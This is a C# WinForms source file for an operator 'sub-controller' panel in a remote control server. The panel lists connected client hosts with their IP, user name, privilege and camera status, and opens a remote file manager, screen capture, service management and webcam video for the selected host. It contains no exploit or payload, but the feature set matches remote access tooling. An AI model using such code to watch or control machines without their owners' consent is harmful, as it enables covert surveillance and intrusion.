using System;
using System.Collections.Generic;
using System.Drawing;
using System.Windows.Forms;
using RemoteControl.Protocals;
using RemoteControl.Protocals.Request;
using RemoteControl.Server.Utils;

namespace RemoteControl.Server
{
    public partial class FrmSubController : FrmBase
    {
        private FrmMain _mainForm;
        private readonly List<SocketSession> _sessions = new List<SocketSession>();
        private readonly Dictionary<string, SocketSession> _sessionIndex = new Dictionary<string, SocketSession>();
        private readonly Dictionary<string, TreeNode> _nodeIndex = new Dictionary<string, TreeNode>();
        private SocketSession _currentSession;

        public FrmSubController(FrmMain mainForm)
        {
            _mainForm = mainForm;
            InitializeComponent();
        }

        private void FrmSubController_Load(object sender, EventArgs e)
        {
            treeViewClients.ContextMenuStrip = contextMenu;
            treeViewClients.Nodes.Add("online", "在线主机");
            treeViewClients.Nodes["online"].Expand();

            // 同步已有在线客户端
            var existing = _mainForm.GetOnlineSessions();
            foreach (var s in existing)
            {
                AddSessionNode(s);
            }
            UpdateStatus();

            // 订阅服务器事件
            var server = RSCApplication.oRemoteControlServer;
            if (server != null)
            {
                server.ClientConnected += OnClientConnected;
                server.ClientDisconnected += OnClientDisconnected;
                server.ClientListChanged += OnClientListChanged;
            }
            LogMessage("副控面板已启动，在线主机: " + _sessions.Count);
        }

        private void FrmSubController_FormClosing(object sender, FormClosingEventArgs e)
        {
            var server = RSCApplication.oRemoteControlServer;
            if (server != null)
            {
                server.ClientConnected -= OnClientConnected;
                server.ClientDisconnected -= OnClientDisconnected;
                server.ClientListChanged -= OnClientListChanged;
            }
        }

        #region TreeView 选中事件

        private void treeViewClients_AfterSelect(object sender, TreeViewEventArgs e)
        {
            var session = e.Node.Tag as SocketSession;
            if (session == null)
            {
                _currentSession = null;
                listViewInfo.Items.Clear();
                return;
            }
            _currentSession = session;
            ShowSessionDetail(session);
        }

        private void ShowSessionDetail(SocketSession session)
        {
            listViewInfo.Items.Clear();
            AddInfoRow("外部IP", session.GetExternalIP());
            AddInfoRow("主机名", session.HostName ?? "");
            AddInfoRow("用户名", session.UserName ?? "");
            AddInfoRow("本地IP", session.LocalIP ?? "");
            AddInfoRow("操作系统", session.OSVersion ?? "");
            AddInfoRow("权限", session.Privilege ?? "");
            AddInfoRow("摄像头", session.CameraStatus ?? "");
            AddInfoRow("备注", session.Remark ?? "");
            AddInfoRow("SocketID", session.SocketId ?? "");
            AddInfoRow("最后活跃", session.LastActiveTime.ToString());
        }

        private void AddInfoRow(string property, string value)
        {
            var item = new ListViewItem(property);
            item.SubItems.Add(value);
            listViewInfo.Items.Add(item);
        }

        #endregion

        #region 受限菜单处理（仅8项功能）

        private void onSubMenuFileManager(object sender, EventArgs e)
        {
            if (_currentSession == null) { MsgBox.Info("请先选择主机！"); return; }
            _mainForm.OpenFileManagerForSession(_currentSession);
            LogMessage("已打开文件管理: " + GetSessionLabel(_currentSession));
        }

        private void onSubMenuScreenCapture(object sender, EventArgs e)
        {
            if (_currentSession == null) { MsgBox.Info("请先选择主机！"); return; }
            var frm = new FrmCaptureScreen(_currentSession);
            string sid = _currentSession.SocketId;
            _mainForm.RegisterScreenHandler(sid, frm.HandleScreen);
            frm.Show();
            var req = new RequestStartGetScreen();
            req.fps = 3;
            _currentSession.Send(ePacketType.PACKET_START_CAPTURE_SCREEN_REQUEST, req);
            LogMessage("已打开屏幕监控: " + GetSessionLabel(_currentSession));
        }

        private void onSubMenuHDScreen(object sender, EventArgs e)
        {
            if (_currentSession == null) { MsgBox.Info("请先选择主机！"); return; }
            var frm = new FrmCaptureScreen(_currentSession);
            string sid = _currentSession.SocketId;
            _mainForm.RegisterScreenHandler(sid, frm.HandleScreen);
            frm.Show();
            var req = new RequestStartGetScreen();
            req.fps = 5;
            _currentSession.Send(ePacketType.PACKET_START_CAPTURE_SCREEN_REQUEST, req);
            LogMessage("已打开高清屏幕: " + GetSessionLabel(_currentSession));
        }

        private void onSubMenuSystemManager(object sender, EventArgs e)
        {
            if (_currentSession == null) { MsgBox.Info("请先选择主机！"); return; }
            var frm = new FrmServiceManager(_currentSession, _currentSession.HostName ?? _currentSession.GetExternalIP());
            frm.Show();
            LogMessage("已打开系统管理: " + GetSessionLabel(_currentSession));
        }

        private void onSubMenuVideoCapture(object sender, EventArgs e)
        {
            if (_currentSession == null) { MsgBox.Info("请先选择主机！"); return; }
            var frm = new FrmCaptureVideo(_currentSession);
            string sid = _currentSession.SocketId;
            _mainForm.RegisterVideoHandler(sid, frm.HandleScreen);
            frm.Show();
            LogMessage("已打开视频查看: " + GetSessionLabel(_currentSession));
        }

        private void onSubMenuChangeRemark(object sender, EventArgs e)
        {
            if (_currentSession == null) { MsgBox.Info("请先选择主机！"); return; }
            var frm = new FrmRename(_currentSession.Remark ?? "");
            if (frm.ShowDialog() == DialogResult.OK)
            {
                _currentSession.SetRemark(frm.NewName);
                UpdateNodeText(_currentSession);
                ShowSessionDetail(_currentSession);
                LogMessage("已更新备注: " + frm.NewName);
            }
        }

        private void onSubMenuCreateGroup(object sender, EventArgs e)
        {
            var frm = new FrmRename("");
            frm.Text = "创建分组";
            if (frm.ShowDialog() == DialogResult.OK && !string.IsNullOrWhiteSpace(frm.NewName))
            {
                TreeNode parentNode = treeViewClients.Nodes["online"];
                FindOrCreateGroupNode(parentNode, frm.NewName.Trim());
                treeViewClients.Sort();
                LogMessage("已创建分组: " + frm.NewName.Trim());
            }
        }

        private void onSubMenuSessionInfo(object sender, EventArgs e)
        {
            if (_currentSession == null) { MsgBox.Info("请先选择主机！"); return; }
            ShowSessionDetail(_currentSession);
            LogMessage("已刷新会话详情: " + GetSessionLabel(_currentSession));
        }

        #endregion

        #region 辅助方法

        private string GetSessionLabel(SocketSession session)
        {
            return session.HostName ?? session.GetExternalIP();
        }

        private void LogMessage(string msg)
        {
            string line = DateTime.Now.ToString("HH:mm:ss") + " " + msg + "\r\n";
            if (textBoxLog.TextLength > 8000)
                textBoxLog.Text = textBoxLog.Text.Substring(textBoxLog.TextLength - 4000);
            textBoxLog.AppendText(line);
        }

        #endregion
    }
}
